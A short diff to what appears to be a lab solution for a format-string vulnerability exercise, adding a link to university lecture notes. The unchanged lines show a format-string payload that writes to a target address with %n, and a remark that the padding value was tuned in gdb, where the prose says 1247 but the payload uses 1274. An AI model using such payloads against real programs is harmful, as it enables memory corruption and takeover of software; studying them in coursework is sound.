@@ -8,3 +8,6 @@ Solution:
 "\x30\xa0\x04\x08 %08x %08x %08x %08x %08x %1274x %n"
 
 Used gdb to check value overwritten till now and adjusted value(1247) according to that.
+
+
+Link: http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
